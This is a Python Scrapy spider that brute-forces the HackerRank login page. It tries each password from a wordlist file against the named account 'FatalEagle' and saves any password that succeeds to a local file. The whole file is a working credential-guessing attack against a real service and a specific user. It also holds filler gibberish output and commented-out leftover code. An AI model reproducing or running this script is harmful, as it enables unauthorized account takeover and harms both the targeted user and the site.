import scrapy
import logging
import sys

from scrapy.item import Item, Field
from scrapy.http import FormRequest
from scrapy.spider import Spider
from scrapy.utils.response import open_in_browser


class QuotesSpider(scrapy.Spider):
    name = "ha"
    start_urls = ['https://www.hackerrank.com/login']
    global b
    global passw
    passw= '-1'
    b=0
    logging.getLogger('scrapy').setLevel(logging.WARNING)
    def parse(self, response):
        global b
        
        response1 = response
        passwordlist = "14.txt"
        list = open(passwordlist, "r")
        passwords = list.readlines()
        k = 0
        while ((b==0) and (k < len(passwords)) ):
            passwords[k] = passwords[k].strip()
            #password = passwords[k]
            #print password
            
            #b=k
            formdata = {'login': 'FatalEagle','bigINnnner': passwords[k]}
            yield FormRequest.from_response(response,
                                            formdata=formdata,
                                            clickdata={'name': 'commit'},
                                            callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
            print '.',
            
            k+=1
        print passw

    def parse1(self, response1,passed):
        global b
        global passw
        #print passed +"........."+ response1.body
        if(response1.body[10:11]=="t"):
            print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
            print b
            t = open('finalpass1.txt',"w")
            t.write(passed)
            print '''
            dwfss
            sd
            sdsfdfs
            sdvgsdvsd
            vsdvsdv
            sdvsdvs
            dvsdvsd
            vsdvsdv
            sdvsdvs
            dvsdvsdv
            sdvsdvs
            dvsdvsd
            vsdvsdv
            sdvsdv
            sdvsdvsd
            vsdvsdv
            sdvsdvsd
            vsdvsdv
            sdvsdvsd
            vsdv
            sdvsdvs
            dvsdvsd
            vsdvsdv
            sdvsdv
            sdvsdv
            sdvsdvsd
            vsdvsdvs
            dvsdv'''
            b=-1
            passw=passed
            print b

        print passed+ '  ',
            #sys.exit("SHUT DOWN EVERYTHING!")
        #else:
        #	print b
        #	print "no" + passed

    #def parse(self, response):
    #    page = response.url.split("/")[-2]
     #   filename = 'quotes-%s.html' % page
     #   with open(filename, 'wb') as f:
     #       f.write(response.body)
